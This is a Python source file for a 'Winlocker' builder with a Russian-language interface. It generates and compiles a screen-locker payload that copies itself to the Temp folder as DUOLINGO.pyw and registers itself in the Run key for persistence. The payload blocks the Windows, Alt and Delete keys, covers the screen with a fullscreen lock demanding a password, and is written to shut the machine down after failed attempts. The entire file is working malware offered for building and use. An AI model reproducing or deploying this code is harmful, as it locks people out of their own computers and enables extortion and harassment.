# coding: utf8

import info, os, random, codecs, subprocess, py_compile

from tkinter import *
from tkinter import messagebox, filedialog
from pathlib import *

class Fonts:
    Title = ("Arial", 15)

class Window(Tk):
    def __init__(self):
        def randompass():
            self.inputPass.delete('1.0', END); 
            self.inputPass.insert(END, random.randint(12384, 841723));
    
        def build():
            code = f'''
            # coding: utf8
import keyboard, shutil, winreg, getpass, os

from tkinter import *
from tkinter import messagebox

true = True 
false = False 

class Window(Tk):
    def __init__(self):
        def unlock():
            if self.P.get("1.0", 'end-1c') != "{self.inputPass.get('1.0', 'end-1c')}" and self.att > 0:
                if self.att > 0:
                    self.att = self.att - 1
                    self.A.configure(text=f"Осталось попыток: " + str(self.att))
                else:
                    self.A.configure(text=f"Пока, винда!")
                    os.system("shutdown /s /t 1") 
            elif self.P.get("1.0", 'end-1c') == "{self.inputPass.get('1.0', 'end-1c')}":
                reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, # path current user
                                 r'Software\Microsoft\Windows\CurrentVersion\Run',0, winreg.KEY_WRITE)
                winreg.DeleteValue(reg_key, "DUOLINGO")
                os.remove("C:\\\\Users\\\\" + getpass.getuser() + "\\\\AppData\\\\Local\\\\Temp\\\\DUOLINGO.pyw")

                                 
                reg_key.Close()
                exit()
        

        super().__init__()
        title = ("Arial", 40)
        desc = ("Arial", 15)

        self.att = 10
        self.title("")

        self.geometry("1920x1080")
        self.attributes("-fullscreen", true)
        self.attributes("-topmost", true)
        self.configure(bg="black")

        self.T = Label(self, text="{str(self.inputTitle.get('1.0', 'end-1c'))}", fg="red", bg="black", font=title)
        self.T.pack()

        self.D = Label(self, text="{str(self.inputDesc.get('1.0', 'end-1c'))}", fg="red", bg="black", font=desc)
        self.D.pack()

        self.A = Label(self, text="Осталось попыток: " + str(self.att), fg="red", bg="black", font=desc)
        self.A.pack()

        self.P = Text(self)
        self.P.pack()
        self.P.insert(END, "Пароль")

        self.U = Button(self, text="РАЗБЛОКИРОВАТЬ", bg="red", relief=FLAT, width=50,height=3, command=unlock)
        self.U.pack()

        self.mainloop()

def create_key(name: str="default", path: str="")->bool:
    # initialize key (create) or open
    reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, # path current user
                                 r'Software\Microsoft\Windows\CurrentVersion\Run', # sub path startup
                                 0, # reserved (must be zero, default is 0)
                                 winreg.KEY_WRITE) # set permission to write

    # CreateKey returns a handle
    # if null it failed
    if not reg_key:
        return False

    # set the value of created key
    winreg.SetValueEx(reg_key, # key
        name,                  # value name
        0,                     # reserved (must be zero, default is 0)
        winreg.REG_SZ,     # REG_SZ - null-terminated string (for file path)
        path) # set file path

    # close key (think of it as opening a file)
    reg_key.Close()
    return True

keyboard.block_key("windows")
keyboard.block_key("alt")
keyboard.block_key("delete")
shutil.copy(__file__, "C:\\\\Users\\\\" + getpass.getuser() + "\\\\AppData\\\\Local\\Temp\\\\DUOLINGO.pyw")
create_key("DUOLINGO", "C:\\\\Users\\\\" + getpass.getuser() + "\\\\AppData\\\\Local\\Temp\\\\DUOLINGO.pyw")

root = Window()
''';
            
            save_file = filedialog.asksaveasfile(mode="w", defaultextension=".pyw", filetypes=[("Python file without console","*.pyw")], initialdir=".\dist")
            if save_file:

                with open(Path(save_file.name).absolute(), 'w', encoding='utf-8') as f:
                    f.write(code)

                py_compile.compile(Path(save_file.name).absolute())
                messagebox.showinfo("Успешно!", f"Winlocker был успешно собран\nПуть: {save_file.name}\nЗащищенный файл лежит в папке __pycache__ в dist");

        super().__init__();

        # Window configuration

        self.title(f"{info.APP_NAME} Builder v{info.VERSION}");
        self.geometry("520x320");

        self.configure(bg="grey10");
        self.resizable(False, False);

        # Title

        self.inputTitle_T = Label(self, text="Заголовок", bg="grey10", font=Fonts.Title);
        self.inputTitle_T.pack();

        self.inputTitle = Text(self, width=25, height=1, bg="grey20"); 
        self.inputTitle.insert(END, "Windows заблокирован!"); 

        self.inputTitle.pack(); 

        # Description

        self.inputDesc_T = Label(self, text="Описание", bg="grey10", font=Fonts.Title);
        self.inputDesc_T.pack();

        self.inputDesc = Text(self, width=29, height=2, bg="grey20"); 
        self.inputDesc.insert(END, "Windows заблокирован за читы"); 

        self.inputDesc.pack(pady=5); 

        # Password

        self.inputPass_T = Label(self, text="Пароль", bg="grey10", font=Fonts.Title);
        self.inputPass_T.pack();

        self.inputPass = Text(self, width=29, height=1, bg="grey20"); 
        self.inputPass.insert(END, "528352"); 

        self.inputPass.pack(pady=5); 

        self.rand = Button(self, text="Случайный Пароль", relief=FLAT, bg="#0373fc", width=17, height=1, command=lambda: randompass());
        self.rand.pack(pady=15);

        # Build

        self.build = Button(self, text="Собрать", relief=FLAT, bg="#0373fc", width=13, height=2, command=lambda: build());
        self.build.pack();

        # Main

        self.mainloop();

if __name__ == "__main__":
    root = Window();
